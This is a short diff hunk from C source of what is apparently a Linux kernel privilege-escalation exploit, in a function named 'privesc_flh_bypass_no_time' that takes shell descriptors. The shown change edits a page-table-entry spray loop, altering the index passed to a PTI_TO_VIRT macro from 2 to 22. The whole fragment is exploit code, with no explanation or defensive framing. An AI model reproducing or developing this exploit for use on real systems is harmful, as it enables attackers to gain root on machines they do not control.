@@ -317,7 +317,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
+		*(char*)PTI_TO_VIRT(22, 0, i, 0, 0) = 0x41;
 
 
 	
